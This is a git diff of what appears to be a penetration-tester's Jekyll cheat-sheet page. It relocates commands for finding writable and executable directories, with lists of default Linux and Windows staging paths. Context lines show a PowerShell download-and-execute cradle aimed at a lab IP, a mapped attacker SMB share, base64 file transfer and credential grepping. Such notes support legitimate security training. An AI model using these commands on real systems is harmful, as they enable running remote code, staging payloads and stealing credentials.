@@ -3,6 +3,44 @@ layout: tips
 title: Tips and Tricks
 ---
 
+Finding interesting locations
+=============================
+{% highlight bash%}
+Writable files directories
+find / -writable -type d 2>/dev/null
+find / -perm -222 -type d 2>/dev/null
+find / -perm -o w -type d 2>/dev/null
+Executable folder
+find / -perm -o x -type d 2>/dev/null
+Writable and executable folders
+find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
+By default on Linux:
+/tmp
+/tmp
+/var/tmp
+/dev/shm
+/var/spool/vbox
+/var/spool/samba
+By default on Windows:
+C:\Windows\Tasks 
+C:\Windows\Temp 
+C:\windows\tracing
+C:\Windows\Registration\CRMLog
+C:\Windows\System32\FxsTmp
+C:\Windows\System32\com\dmp
+C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+C:\Windows\System32\spool\PRINTERS
+C:\Windows\System32\spool\SERVERS
+C:\Windows\System32\spool\drivers\color
+C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
+C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
+C:\Windows\SysWOW64\FxsTmp
+C:\Windows\SysWOW64\com\dmp
+C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
+C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
+{% endhighlight %}
+[Back to the top](#header)
+
 Metasploit
 ==========
 Updates
@@ -23,6 +61,7 @@ or
 mv exploit.rb ~/.msf4/modules/exploit/exploit.rb and msf > reload_all
 {% endhighlight %}
 sessions -l :list sessions
+[Back to the top](#header)
 
 Convert to UTF-16LE
 ===================
@@ -36,6 +75,7 @@ root@kali:~# echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10
 00000010: 4f00 6200 6a00 6500 6300 7400 2000 4e00  O.b.j.e.c.t. .N.
 00000020: 6500 7400 2e00 5700 6500 6200 4300 6c00  e.t...W.e.b.C.l.
 {% endhighlight %}
+[Back to the top](#header)
 
 Setting up SMB server
 =====================
@@ -59,7 +99,7 @@ $cred = New-Object System.Management.Automation.PsCredential('root',$pass)
 $cred #to verify it is created
 New-PSDrive -name root -root \\10.10.14.1\sharingiscaring -Credential $cred -PSProvider "filesystem"
 {% endhighlight %}
-
+[Back to the top](#header)
 
 One Liners
 ==========
@@ -91,37 +131,6 @@ Easy transfert
 base64 -w 0 filetotransfert
 echo "iOgogIG1haW4oKQo=" | base64 -d > filename
 {% endhighlight %}
-Finding writable locations
-{% highlight bash%}
-Writable files directories
-find / -writable -type d 2>/dev/null
-find / -perm -222 -type d 2>/dev/null
-find / -perm -o w -type d 2>/dev/null
-Executable folder
-find / -perm -o x -type d 2>/dev/null
-Writable and executable folders
-find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
-By default on Linux:
-/tmp
-/...
-By default on Windows:
-C:\Windows\Tasks 
-C:\Windows\Temp 
-C:\windows\tracing
-C:\Windows\Registration\CRMLog
-C:\Windows\System32\FxsTmp
-C:\Windows\System32\com\dmp
-C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
-C:\Windows\System32\spool\PRINTERS
-C:\Windows\System32\spool\SERVERS
-C:\Windows\System32\spool\drivers\color
-C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
-C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
-C:\Windows\SysWOW64\FxsTmp
-C:\Windows\SysWOW64\com\dmp
-C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
-C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
-{% endhighlight %}
 Looking for creds in the directory
 {% highlight bash%}
 Grabbing full word
@@ -137,7 +146,6 @@ Untar
 {% highlight bash%}
 tar -xvf
 {% endhighlight %}
-
 [Back to the top](#header)
 
 Reverse shells
